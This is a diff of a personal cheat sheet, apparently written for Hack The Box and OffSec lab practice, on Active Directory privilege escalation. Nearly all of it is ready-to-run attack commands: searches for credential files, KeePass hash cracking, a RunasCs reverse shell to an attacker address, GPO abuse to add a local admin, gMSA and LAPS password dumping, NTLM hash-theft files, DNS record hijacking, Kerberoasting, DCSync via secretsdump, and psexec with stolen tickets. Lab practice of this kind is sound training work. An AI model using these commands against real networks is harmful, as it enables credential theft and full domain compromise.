@@ -1,10 +1,10 @@
 # AD PrivEsc
 
+{% hint style="info" %}
 dc-ip you aclly gotta add the dc dns name too to hosts eg. dc.manager.htb or sum
 
-printer config -> return \[easy]
-
-krbrelayx, so many relays in impacket itself \[ntlmrelayx]
+printer config -> return \[HTB AD Easy]
+{% endhint %}
 
 {% embed url="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet" %}
 
@@ -16,45 +16,85 @@ krbrelayx, so many relays in impacket itself \[ntlmrelayx]
 Ultimate AD Mindmap
 {% endembed %}
 
-### Bloodhound
+## Fundamentals
+
+### DC Full Name
+
+{% hint style="info" %}
+Hutch WIndows PG
+{% endhint %}
+
+Full name aka DC name would be hostname of computer + domain name ie. `hutchdc.hutch.offsec` \[bloodhound don't work without this]
+
+### Looting
+
+**Cached Credentials**
+
+**Database Files**
+
+* `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+* `keepass2john Database.kdbx > Keepasshash.txt`
+* `john --wordlist=/usr/share/wordlists/rockyou.txt Keepasshash.txt`
+
+**PowerShell history**
+
+* `Get-History`
+* `(Get-PSReadlineOption).HistorySavePath`
+* `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` (Run for each user)
+
+**Interesting Files**
+
+* `cmdkey /list`
+* In Users directories `Get-ChildItem -Path C:\Users\ -Include *.txt,*.log,*.xml,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+* On Filesystem `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
+* `sysprep.*` `unattend.*`
+* `Group Policies` `gpp-decrypt <hash>`
+
+## Bloodhound
 
 ```
 ./SharpHound.exe --CollectionMethod All
 bloodhound-python -u '[user]' -p '[password]' -d [domain] -dc [dc] -ns [ip] -c all
 ```
 
-#### SharpGPOAbuse - Modify Group Policy Objects
+### Handy Tools
+
+**SharpGPOAbuse - Modify Group Policy Objects**
 
 ```
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount [user] --GPOName [fake_GPO]
 gpupdate /force
 ```
 
-#### RunAs - Sudo for Windows
+**RunasCs - If runas not there**
 
 ```
 .\RunasCs.exe "[user]" '[password]' powershell.exe -r 10.10.14.2:9001
 ```
 
-#### gMSADumper - Reads any gMSA password blobs the user can access
+**gMSADumper - Reads any gMSA password blobs the user can access**
 
 ```
 python3 gMSADumper.py -u '[user]' -p '[password]' -d [domain]
 ```
 
-#### pyLAPS - Read LAPS if user has the privilege
+**pyLAPS - Read LAPS if user has the privilege**
 
 ```
 python3 pyLAPS.py --action get -d "[domain]" -u "[user]" -p '[password]'
 ```
 
-#### NTLMTheft - Creates files that steal NTLM hashes if clicked on/accessed
+**NTLMTheft - Creates files that steal NTLM hashes if clicked on/accessed**
 
 ```
 python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
 ```
 
-### Rubeus
+## Rubeus
+
+{% hint style="info" %}
+defaultapppool user \[SeImpersonate no creds] from Flight \[HTB AD Hard] can perform DCSync using Rubeus
+{% endhint %}
 
 {% embed url="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" %}
 
@@ -73,16 +113,6 @@ python ntlm_theft.py -g all -s 10.10.14.9 -f jtripz
 ./kerbrute_linux_amd64 userenum -d egotistical-bank.local  ~/htb/sauna/newuser.txt --dc egotistical-bank.local -v | grep 'VALID' 
 ```
 
-#### DNSTool \[krbrelayx] - Edit  ADIDNS (AD Integrated DNS)
-
-Regular users create child objects by default, attackers can leverage that and hijack traffic - no need to be DNS Admin for this
-
-```
-python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.2 --type A 10.10.10.248
-```
-
-### Impacket
-
 #### GetNPUsers - ASREP Roasting for users with no pre-auth
 
 {% code title="18200" %}
@@ -92,12 +122,22 @@ python3 GetNPUsers.py [domain]/ -dc-ip [ip] -usersfile userlist.txt
 ```
 {% endcode %}
 
-#### GetUserSPN - find Service Principal Names that are associated with normal user account
+#### GetUserSPN - find Service Principal Names and hash of associated user account
 
 ```
 python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] 
 python3 GetUserSPNs.py [domain]/[user]:[password] -dc-ip [ip] -request <get ticket here>
 ```
+
+#### DNSTool \[krbrelayx] - Edit  ADIDNS (AD Integrated DNS)
+
+Regular users create child objects by default, attackers can leverage that and hijack traffic - no need to be DNS Admin for this
+
+```
+python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-0xdf --data 10.10.14.2 --type A 10.10.10.248
+```
+
+### Impacket
 
 #### SecretsDump - Dump admin hashes if DCSync privileges enabled
 
@@ -119,6 +159,8 @@ python3 getST.py -spn [SPN] [-impersonate administrator] -hashes [hash] -dc-ip [
 ```
 
 #### PSexec - Semi shell that writes to $ADMIN share
+
+You got a ticket for Admin? THis the place to be
 
 ```
 export KRB5CCNAME=ticket.ccache; python3 psexec.py [domain]/[user]@[dc_domain] -k -no-pass
